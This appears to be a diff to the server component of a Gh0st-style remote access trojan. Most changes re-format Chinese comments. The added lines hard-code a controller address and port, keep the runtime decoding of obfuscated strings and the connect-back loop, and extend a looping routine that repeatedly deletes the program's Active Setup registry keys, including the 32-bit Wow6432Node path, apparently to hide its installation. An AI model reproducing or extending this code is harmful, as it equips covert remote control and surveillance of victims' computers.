@@ -23,10 +23,10 @@ DWORD g_dwServiceType;
 
 enum
 {
-	NOT_CONNECT, //  还没有连接
-	GETLOGINFO_ERROR,//获取信息失败
-	CONNECT_ERROR,//链接失败
-	HEARTBEATTIMEOUT_ERROR //心跳超时链接失败
+	NOT_CONNECT, 			// 还没有连接
+	GETLOGINFO_ERROR,		// 获取信息失败
+	CONNECT_ERROR,			// 链接失败
+	HEARTBEATTIMEOUT_ERROR 	// 心跳超时链接失败
 };
 
 DWORD WINAPI main(char *lpServiceName);
@@ -41,7 +41,7 @@ LONG WINAPI bad_exception(struct _EXCEPTION_POINTERS* ExceptionInfo) {
 
 DWORD WINAPI main(char *lpServiceName)
 {
-	//strcpy(g_strHost, "192.168.1.174");
+	strcpy(g_strHost, "192.168.2.155");
 	g_dwPort = 8088;
 	// lpServiceName,在ServiceMain返回后就没有了
 	char	strServiceName[256] = {0};
@@ -52,21 +52,21 @@ DWORD WINAPI main(char *lpServiceName)
 	HWINSTA hOldStation = GetProcessWindowStation();
 
 	
-	char winsta0[] = { 0x07,0xbc,0xa3,0xa7,0xbb,0xb3,0xa7,0xf5};//winsta0
-	char* lpszWinSta = decodeStr(winsta0);						//解密函数
+	char winsta0[] = { 0x07,0xbc,0xa3,0xa7,0xbb,0xb3,0xa7,0xf5};// winsta0
+	char* lpszWinSta = decodeStr(winsta0);						// 解密函数
 
 	HWINSTA hWinSta = OpenWindowStation(lpszWinSta, FALSE, MAXIMUM_ALLOWED);
 
-	memset(lpszWinSta, 0, winsta0[STR_CRY_LENGTH]);				//填充0
-	delete lpszWinSta;											//释放
+	memset(lpszWinSta, 0, winsta0[STR_CRY_LENGTH]);				// 填充0
+	delete lpszWinSta;											// 释放
 
 	if (hWinSta != NULL)
 		SetProcessWindowStation(hWinSta);
 	//
 	//////////////////////////////////////////////////////////////////////////
 
-	  //--这里判断CKeyboardManager::g_hInstance是否为空 如果不为空则开启错误处理
-	 //--这里要在dllmain中为CKeyboardManager::g_hInstance赋值
+	 // 这里判断CKeyboardManager::g_hInstance是否为空 如果不为空则开启错误处理
+	 // 这里要在dllmain中为CKeyboardManager::g_hInstance赋值
 	if (CKeyboardManager::g_hInstance != NULL)
 	{
 		//设置异常
@@ -76,9 +76,9 @@ DWORD WINAPI main(char *lpServiceName)
 		wsprintf(strKillEvent, "Global\\CcRem %d", GetTickCount()); // 随机事件名
 
 		hInstallMutex = CreateMutex(NULL, true, g_strHost);
-		//ReConfigService(strServiceName); 
+		// ReConfigService(strServiceName); 
 		// 删除安装文件
-	//	DeleteInstallFile(lpServiceName);  
+		// DeleteInstallFile(lpServiceName);  
 	}
 	// 告诉操作系统:如果没有找到CD/floppy disc,不要弹窗口吓人
 	SetErrorMode(SEM_FAILCRITICALERRORS);
@@ -136,9 +136,9 @@ DWORD WINAPI main(char *lpServiceName)
 		// 登录
 		DWORD dwExitCode = SOCKET_ERROR;
 		sendLoginInfo(strServiceName, &socketClient, GetTickCount() - dwTickCount);
-		//---注意这里连接成功后声明了一个CKernelManager 到CKernelManager类查看一下
+		// 接成功后声明了一个CKernelManager 到CKernelManager
 		CKernelManager	manager(&socketClient, strServiceName, g_dwServiceType, strKillEvent, lpszHost, dwPort);
-		//socketClient中的主回调函数设置位这CKernelManager类中的OnReceive 
+		// socketClient中的主回调函数设置位这CKernelManager类中的OnReceive 
 		//（每个功能类都有OnReceive函数来处理接受的数据他们都继承自父类CManager）
 		socketClient.setManagerCallBack(&manager);
 
@@ -155,7 +155,7 @@ DWORD WINAPI main(char *lpServiceName)
 		//////////////////////////////////////////////////////////////////////////
 
 		DWORD	dwIOCPEvent;
-		dwTickCount = GetTickCount();//获取时间戳
+		dwTickCount = GetTickCount();// 获取时间戳
 
 		do
 		{
@@ -174,7 +174,7 @@ DWORD WINAPI main(char *lpServiceName)
 #ifdef _DLL
 	//////////////////////////////////////////////////////////////////////////
 	// Restor WindowStation and Desktop	
-	// 不需要恢复卓面，因为如果是更新服务端的话，新服务端先运行，此进程恢复掉了卓面，会产生黑屏
+	// 不需要恢复桌面，因为如果是更新服务端的话，新服务端先运行，此进程恢复掉了卓面，会产生黑屏
 	// 	SetProcessWindowStation(hOldStation);
 	// 	CloseWindowStation(hWinSta);
 	//
@@ -325,9 +325,12 @@ DWORD WINAPI DelAXRegThread(LPVOID lpParam)
 	char strFileName[MAX_PATH];     //dll文件名
 	char *pstrTemp = NULL;
 	char ActiveXStr[1024];           //activex 键值字符串
+	char ActiveXStr32[1024];           //activex 键值字符串
 
 	ZeroMemory(ActiveXStr, 1024);
 	ZeroMemory(strFileName, MAX_PATH);
+	ZeroMemory(ActiveXStr32, 1024);
+
 	//得到自身文件名
 	GetModuleFileName(CKeyboardManager::g_hInstance, strFileName, MAX_PATH);
 	PathStripPath(strFileName); //将完整文件名转换为文件名
@@ -337,11 +340,14 @@ DWORD WINAPI DelAXRegThread(LPVOID lpParam)
 		ZeroMemory(pstrTemp, strlen(pstrTemp));  //删除掉扩展名
 		//构造键值
 		sprintf(ActiveXStr, "%s%s", "Software\\Microsoft\\Active Setup\\Installed Components\\", strFileName);
+		sprintf(ActiveXStr32, "%s%s", "Software\\Wow6432Node\\Microsoft\\Active Setup\\Installed Components\\", strFileName);
 		while (1)
 		{
 			//不停的删除注册表
 			RegDeleteKey(HKEY_CURRENT_USER, ActiveXStr);
 			OutputDebugString(ActiveXStr);      //输出删除的字串用以测试
+			RegDeleteKey(HKEY_CURRENT_USER, ActiveXStr32);
+			OutputDebugString(ActiveXStr32);  
 			Sleep(1000 * 30);
 		}
 	}
